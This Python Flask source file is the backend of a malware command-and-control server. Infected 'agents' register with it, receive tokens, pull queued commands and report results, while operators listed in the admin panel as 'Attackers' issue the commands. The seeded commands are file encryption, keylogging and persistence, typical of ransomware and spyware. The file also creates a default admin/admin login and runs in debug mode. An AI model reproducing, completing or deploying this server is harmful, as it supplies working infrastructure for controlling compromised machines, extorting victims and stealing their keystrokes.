#!venv/bin/python
import enum
import logging
import os
import random
import uuid
from datetime import datetime, timedelta
from http import HTTPStatus

from enum import Enum
from functools import wraps
from typing import List, Optional

from Utilities.Constants import CommandEnum
from Utilities.Logging import setup_logger

from sqlalchemy.orm import backref
from werkzeug.datastructures import Authorization
from construct import Switch
from flask import Flask, url_for, redirect, request, abort, jsonify, make_response, Markup
from flask_sqlalchemy import SQLAlchemy
from flask_security import Security, SQLAlchemyUserDatastore, \
    UserMixin, RoleMixin, current_user
from flask_security.utils import encrypt_password
import flask_admin
from flask_admin.contrib import sqla
from flask_admin import helpers as admin_helpers
from wtforms import PasswordField
import marshmallow as ma
import datetime
import jwt
from flask import send_file

# Create Flask application
app = Flask(__name__)
app.config.from_pyfile('config.py')
db = SQLAlchemy(app)


# ------
# | DB |
# ------


# Define models
roles_users = db.Table(
        'roles_users',
        db.Column('user_id', db.Integer(), db.ForeignKey('users.id')),
        db.Column('role_id', db.Integer(), db.ForeignKey('roles.id'))
)


class Role(db.Model, RoleMixin):
    __tablename__ = "roles"

    id = db.Column(db.Integer(), primary_key=True)
    name = db.Column(db.String(80), unique=True)
    description = db.Column(db.String(255))

    def __str__(self):
        return self.name


class User(db.Model, UserMixin):
    __tablename__ = "users"

    id = db.Column(db.Integer, primary_key=True)
    first_name = db.Column(db.String(255), nullable=True)
    last_name = db.Column(db.String(255), nullable=True)
    email = db.Column(db.String(255), unique=True, nullable=False)
    password = db.Column(db.String(255), nullable=False)
    active = db.Column(db.Boolean())
    roles = db.relationship('Role', secondary=roles_users,
                            backref=db.backref('users', lazy='dynamic'))

    def __str__(self):
        return self.email


class Command(db.Model):
    __tablename__ = "commands"

    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(255), nullable=True)

    def __str__(self):
        return self.name


class AgentType(enum.Enum):
    RegularAgent = 1
    ValidatorAgent = 2


class Agent(db.Model):
    __tablename__ = "agents"
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(50), unique=True)
    setup_time = db.Column(db.DateTime, nullable=True)
    os_type = db.Column(db.String(10), nullable=True)
    last_seen = db.Column(db.DateTime, nullable=True)
    local_ip = db.Column(db.String(15), nullable=True)
    public_ip = db.Column(db.String(15), nullable=True)
    pretty_name = db.Column(db.String(255), nullable=True)
    user_id = db.Column(db.Integer, db.ForeignKey("users.id", name="agents_users_fk"), nullable=True)
    agent_type = db.Column(db.Enum(AgentType))

    def __str__(self):
        return f"{self.pretty_name}"


class AgentSchema(ma.Schema):
    class Meta:
        fields = ('setup_time', 'os_type', 'last_seen', 'ip', 'pretty_name', 'user_id')

class CommandRequest(db.Model):
    __tablename__ = "command_requests"

    id = db.Column(db.Integer, primary_key=True)
    args = db.Column(db.Text(), nullable=True)
    payload = db.Column(db.Text(), nullable=True)
    succeeded = db.Column(db.Boolean, nullable=True)
    result = db.Column(db.String(255), nullable=True)
    error_result = db.Column(db.String(255), nullable=True)
    pulled = db.Column(db.Boolean, nullable=False, default=False)
    agent_id = db.Column(db.Integer, db.ForeignKey("agents.id", name="command_requests_agents_fk"), nullable=True)
    agent = db.relationship(Agent)
    is_checked = db.Column(db.Boolean, nullable=False, default=False)
    command_id = db.Column(db.Integer, db.ForeignKey("commands.id", name="command_requests_commands_fk"), nullable=True)
    command = db.relationship(Command)


class CommandRequestSchema(ma.Schema):
    class Meta:
        fields = ('id', "args", 'payload', 'succeeded', 'result', 'error_result', 'pulled', 'agent_id', 'agent', 'command_id', 'command')


class CommandTest(db.Model):
    __tablename__ = "command_test_requests"

    id = db.Column(db.Integer, primary_key=True)
    result = db.Column(db.Text(), nullable=True)
    is_passed_test = db.Column(db.Boolean, nullable=False, default=False)
    pulled = db.Column(db.Boolean, nullable=False, default=False)
    agent_id = db.Column(db.Integer, db.ForeignKey("agents.id", name="command_test_requests_agents_fk"), nullable=True)
    agent = db.relationship(Agent)
    command_id = db.Column(db.Integer, db.ForeignKey("commands.id", name="command_test_requests_commands_fk"), nullable=True)
    command = db.relationship(Command)
    command_request_id = db.Column(db.Integer, db.ForeignKey("command_requests.id", name="command_test_requests_commands_requests_fk"), nullable=True)
    command_request = db.relationship(CommandRequest)


# Setup Flask-Security
user_datastore = SQLAlchemyUserDatastore(db, User, Role)
security = Security(app, user_datastore)


# ---------
# | Views |
# ---------


# Create customized model view class
class ModelViewForAdmin(sqla.ModelView):
    def is_accessible(self):
        if not current_user.is_active or not current_user.is_authenticated:
            return False

        return True

    def _handle_view(self, name, **kwargs):
        """
        Override builtin _handle_view in order to redirect users when a view is not accessible.
        """
        if not self.is_accessible():
            if current_user.is_authenticated:
                # permission denied
                abort(403)
            else:
                # login
                return redirect(url_for('security.login', next=request.url))

    can_edit = True
    edit_modal = True
    create_modal = True
    can_export = False
    can_view_details = True
    details_modal = True


class ModelViewForUser(sqla.ModelView):
    def is_accessible(self):
        if not current_user.is_active or not current_user.is_authenticated:
            return False

        return True

    def _handle_view(self, name, **kwargs):
        """
        Override builtin _handle_view in order to redirect users when a view is not accessible.
        """
        if not self.is_accessible():
            if current_user.is_authenticated:
                # permission denied
                abort(403)
            else:
                # login
                return redirect(url_for('security.login', next=request.url))

    edit_modal = True
    create_modal = True
    can_view_details = False
    details_modal = True


class UserView(ModelViewForAdmin):
    column_editable_list = ['email', 'first_name', 'last_name']
    column_searchable_list = column_editable_list
    column_exclude_list = ['password']
    form_excluded_columns = column_exclude_list
    column_details_exclude_list = column_exclude_list
    column_filters = column_editable_list
    form_overrides = {
        'password': PasswordField
    }

    def get_query(self):
        if current_user.has_role('superuser'):
            return self.session.query(self.model)
        return self.session.query(self.model).filter(self.model.id == current_user.id)


class AgentsView(ModelViewForUser):
    column_exclude_list = ['agent_id']
    column_details_exclude_list = column_exclude_list
    can_edit = False
    can_create = False
    can_delete = False

    def get_query(self):
        if current_user.has_role('superuser'):
            return self.session.query(self.model)
        return self.session.query(self.model).filter(self.model.user_id == current_user.id)


def filtering_function():
    agents = db.session.query(Agent).filter(Agent.agent_type == AgentType.RegularAgent)
    return agents


class CommandRequestsView(ModelViewForUser):
    form_excluded_columns = ['succeeded', 'result', 'error_result', 'pulled', 'payload', "is_checked"]

    def get_query(self):
        query = self.session.query(self.model)
        if current_user.has_role('superuser'):
            return query
        agents_ids = self.session.query(Agent.id).filter(Agent.user_id == current_user.id)
        return query.filter(self.model.agent_id.in_(agents_ids))

    def after_model_change(self, form, model, is_created):
        if is_created:

            if model.agent.agent_type == AgentType.RegularAgent:
                matches_validators = self.session.query(Agent).filter(Agent.agent_type == AgentType.ValidatorAgent).filter(Agent.os_type == model.agent.os_type).all()
                if len(matches_validators) > 0:
                    random_validator = random.choice(matches_validators)
                    db.session.add(
                        CommandTest(result="",
                                    agent_id=random_validator.id,
                                    command_id=model.command_id,
                                    command_request_id=model.id
                                    )
                    )

                    db.session.commit()

                else:
                    print("[-] There is no matching validator for the requested agent os type, command won't be "
                          "processed")
                print(f"model => {model}")
                print(f"form => {form}")
        pass

    form_args = dict(
            agent=dict(query_factory=filtering_function)
    )


class FileView(ModelViewForUser):
    column_list = ['agent', 'name', 'link']
    can_edit = False
    can_create = False
    can_delete = False

    def get_query(self):
        query = self.session.query(self.model)
        if current_user.has_role('superuser'):
            return query
        agents_ids = self.session.query(Agent.id).filter(Agent.user_id == current_user.id)
        return query.filter(self.model.agent_id.in_(agents_ids))

# ------------------
# | Authentication |
# ------------------


def generate_jwt_with_expiration_date(token_fields, key):
    token_fields["exp"] = datetime.datetime.now(tz=datetime.timezone.utc) + datetime.timedelta(days=30)
    return jwt.encode(token_fields, key)


# decorator for verifying the JWT
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None

        auth = request.authorization
        if auth is None and 'Authorization' in request.headers:
            try:
                auth_type, token = request.headers['Authorization'].split(
                    None, 1)
                if auth_type.lower() == "bearer":
                    auth = Authorization(auth_type, {'token': token})
            except ValueError:
                # The Authorization header is either empty or has no token
                pass

        if auth is None:
            print(f"Token is None")
            return jsonify({'message': 'Authentication token is missing'}), 401

        # return 401 if token is not passed
        if not token:
            return jsonify({'message': 'Token is missing !!'}), 401

        try:
            # decoding the payload to fetch the stored details
            data = jwt.decode(token, app.config['SECRET_KEY'], ["HS256"])
            agent_obj = Agent.query.filter_by(agent_id=data['agent_id']).first()

            if agent_obj is None:
                return jsonify({
                    'message': 'Token is invalid !! {}'
                }), 401

        except Exception as e:
            return jsonify({
                'message': 'Token is invalid !! {0}'.format(e)
            }), 401
        # returns the current logged in users contex to the routes
        return f(agent_obj, *args, **kwargs)

    return decorated


#

@app.route('/')
def index():
    return redirect(url_for('security.login'))


# -------
# | API |
# -------


@app.route('/api/validatorregister', methods=['POST'])
def validator_register(os_type=None, pretty_name=None):

    if os_type is None:
        os_type = request.json['os_type']
        pretty_name = request.json['pretty_name']

    setup_time = datetime.datetime.now()
    last_seen = datetime.datetime.now()
    agent_id = str(uuid.uuid4())
    local_ip = request.json['local_ip']
    public_ip = request.json['public_ip']

    # generates the JWT Token
    token = generate_jwt_with_expiration_date({'agent_id': agent_id}, app.config['SECRET_KEY'])

    # The agent isn't acquired yet by any user so we will set it to -1
    new_agent = Agent(agent_id=agent_id, setup_time=setup_time, os_type=os_type, last_seen=last_seen,
                        public_ip=public_ip, local_ip=local_ip, pretty_name=pretty_name, user_id=-1, agent_type=AgentType.ValidatorAgent)
    db.session.add(new_agent)
    db.session.commit()
    return jsonify({"jwt": token, "agent": AgentSchema(many=False).dump(new_agent)})


@app.route('/api/agentregister', methods=['POST'])
def agent_register(os_type=None, pretty_name=None):

    if os_type is None:
        os_type = request.json['os_type']
        pretty_name = request.json['pretty_name']

    setup_time = datetime.datetime.now()
    last_seen = datetime.datetime.now()
    agent_id = str(uuid.uuid4())
    local_ip = request.json['local_ip']
    public_ip = request.json['public_ip']

    # generates the JWT Token
    token = generate_jwt_with_expiration_date({'agent_id': agent_id}, app.config['SECRET_KEY'])

    # The agent isn't acquired yet by any user so we will set it to -1
    new_agent = Agent(agent_id=agent_id, setup_time=setup_time, os_type=os_type, last_seen=last_seen,
                        public_ip=public_ip, local_ip=local_ip, pretty_name=pretty_name, user_id=-1, agent_type=AgentType.RegularAgent)
    db.session.add(new_agent)
    db.session.commit()
    return jsonify({"jwt": token, "agent": AgentSchema(many=False).dump(new_agent)})


@app.route('/api/pull_test_commands_requests', methods=['POST'])
@token_required
def pull_commands_test_requests(current_agent):
    commands_test_reqs: List[CommandTest] = db.session.query(CommandTest).filter(CommandTest.agent_id == current_agent.id). \
        filter(CommandTest.pulled == False).all()

    result: List[dict] = []

    for commands_test_obj in commands_test_reqs:
        commands_test_obj.pulled = True
        result.append({"commandTestId": commands_test_obj.id, "commandType": commands_test_obj.command_request.command.id, "result": commands_test_obj.result})

    db.session.commit()

    out = {
        'status': HTTPStatus.OK,
        "commands_test_count": len(result),
        'commands_list': result
    }

    return jsonify(out)


@app.route('/api/set_command_test_status', methods=['POST'])
@token_required
def set_command_test_status(current_agent):
    command_test_request_id = int(request.json['command_test_request_id'])
    command_test_request_payload = str(request.json['command_test_request_payload'])
    is_passed_test = bool(request.json['command_request_is_passed_test'])
    command_test_request: Optional[CommandTest] = db.session.query(CommandTest).filter(CommandTest.id == command_test_request_id).first()
    if command_test_request is not None:
        command_test_request.is_passed_test = is_passed_test
        command_test_request.command_request.payload = command_test_request_payload
        command_test_request.command_request.is_checked = is_passed_test
        db.session.commit()
        out = {
            'status': HTTPStatus.OK,
            'message': f"command_request_id {command_test_request_id} status saved successful."
        }
    else:
        out = {
            'status': HTTPStatus.INTERNAL_SERVER_ERROR,
            'message': f"command_request_id {command_test_request_id} is not exists in the system."
        }
    return jsonify(out)


@app.route('/api/pull_commands_requests', methods=['POST'])
@token_required
def pull_commands_requests(current_agent):
    commands_reqs: List[CommandRequest] = db.session.query(CommandRequest).filter(CommandRequest.agent_id == current_agent.id). \
        filter(CommandRequest.pulled == False).filter(CommandRequest.is_checked == True).all()

    result: List[dict] = []

    for commands_req in commands_reqs:
        commands_req.pulled = True
        result.append({"commandId": commands_req.id, "commandType": getattr(CommandEnum, commands_req.command.name).value, "commandPayload": commands_req.payload, "commandStatus": False})

    db.session.commit()

    out = {
        'status': HTTPStatus.OK,
        "commands_count": len(result),
        'commands_list': result
    }

    return jsonify(out)


@app.route('/api/set_command_status', methods=['POST'])
@token_required
def set_command_status(current_agent):
    logging.debug(f"[+] DEBUGDEBUG => request.json => {request.json}")
    command_request_id = int(request.json['command_request_id'])
    command_request_result = request.json['command_request_result']
    command_request_error = request.json['command_request_error']
    command_request_succeeded = True if command_request_error == "" else False
    command_request: Optional[CommandRequest] = db.session.query(CommandRequest).filter(CommandRequest.id == command_request_id).first()
    if command_request is not None:
        command_request.succeeded = command_request_succeeded
        command_request.result = command_request_result
        command_request.error_result = command_request_error
        db.session.commit()
        out = {
            'status': HTTPStatus.OK,
            'message': f"command_request_id {command_request_id} status saved successful."
        }
    else:
        out = {
            'status': HTTPStatus.INTERNAL_SERVER_ERROR,
            'message': f"command_request_id {command_request_id} is not exists in the system."
        }
    return jsonify(out)


# ---------------
# | Flask Admin |
# ---------------

# Create admin
admin = flask_admin.Admin(
        app,
        'My Dashboard',
        base_template='my_master.html',
        template_mode='bootstrap4',
)

# Add model views
admin.add_view(UserView(User, db.session, menu_icon_type='fa', menu_icon_value='fa-users', name="Attackers"))
admin.add_view(AgentsView(Agent, db.session, menu_icon_type='fa', menu_icon_value='fa-street-view', name="Agents"))
admin.add_view(CommandRequestsView(CommandRequest, db.session, menu_icon_type='fa', menu_icon_value='fa-server', name="Command requests"))


# define a context processor for merging flask-admin's template context into the
# flask-security views.
@security.context_processor
def security_context_processor():
    return dict(
            admin_base_template=admin.base_template,
            admin_view=admin.index_view,
            h=admin_helpers,
            get_url=url_for
    )


# -------------
# | Utilities |
# -------------


def build_sample_db():
    """
    Populate a small db with some example entries.
    """

    db.drop_all()
    db.create_all()

    with app.app_context():
        user_role = Role(name='user')
        super_user_role = Role(name='superuser')
        db.session.add(user_role)
        db.session.add(super_user_role)
        db.session.commit()

        user_datastore.create_user(
                first_name='Admin',
                email='admin',
                password=encrypt_password('admin'),
                roles=[user_role, super_user_role]
        )

        user_datastore.create_user(
            first_name="John",
            last_name="Doe",
            email="john@doe.com",
            password=encrypt_password("pass"),
            roles=[user_role, ]
        )

        db.session.add(Command(name=CommandEnum.ENCRYPT_FILE.name))
        db.session.add(Command(name=CommandEnum.KEY_LOGGING.name))
        db.session.add(Command(name=CommandEnum.SET_PERSISTENCE.name))

        db.session.commit()

    return


def main():
    setup_logger()

    # Build a sample db on the fly, if one does not exist yet.
    app_dir = os.path.realpath(os.path.dirname(__file__))
    database_path = os.path.join(app_dir, app.config['DATABASE_FILE'])
    if not os.path.exists(database_path):
        build_sample_db()

    # Start app
    app.run(host="0.0.0.0", debug=True, port=5000)


if __name__ == '__main__':
    main()
